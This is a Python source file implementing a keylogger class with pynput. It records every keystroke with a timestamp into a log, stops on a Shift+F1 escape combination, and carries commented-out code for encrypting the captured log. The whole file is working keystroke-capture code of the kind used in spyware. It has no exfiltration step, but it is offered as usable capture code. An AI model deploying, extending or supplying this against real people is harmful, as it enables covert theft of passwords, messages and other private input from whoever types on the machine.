import threading
import pynput
from datetime import datetime

KEY = pynput.keyboard.Key

class Keylogger:
    def __init__(self, escape_combo=(KEY.shift, KEY.f1)):
        """
        initialize keylogger attributes
        """
        self.key_log = ""
        self.keylogger_running = False
        self.key_combo = []
        self.escape_combo = list(escape_combo)
        self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)

    def get_key_log(self):
        """
        return the current key log
        encryption commented out
        """
        # key = load_key()
        # encrypted_log = encrypt_data(self.key_log, key)
        # return encrypted_log
        return self.key_log

    def clear_key_log(self):
        """
        clear the key log
        """
        self.key_log = ""

    def start(self):
        """
        start the key listener and set running flag to True
        """
        self.key_listener.start()
        self.keylogger_running = True

    def stop_key_logger(self):
        """
        stop the key listener and set running flag to true
        """
        self.key_listener.stop()
        self.keylogger_running = False
        threading.Thread.__init__(self.key_listener)

    def check_escape_char(self, key):
        """
        check if the escape key combination is pressed to stop the keylogger
        """
        self.key_combo.append(key)
        if key != self.escape_combo[len(self.key_combo) - 1]:
            self.key_combo = []
        elif self.key_combo == self.escape_combo:
            self.stop_key_logger()

    def on_keyboard_event(self, event):
        """
        log the key event with a timestamp
        this will appear in the log txt
        """
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        key_event_map = {
            KEY.backspace: "[BACKSPACE]",
            KEY.tab: "[TAB]",
            KEY.enter: "[ENTER]",
            KEY.space: "[SPACE]"
        }

        if event in key_event_map:
            self.key_log += f"[{timestamp}] {key_event_map[event]}\n"
        elif isinstance(event, pynput.keyboard.Key):
            self.key_log += f"[{timestamp}] [{event.name.upper()}]\n"
        else:
            self.key_log += f"[{timestamp}] {event.char}\n"

        self.check_escape_char(event)
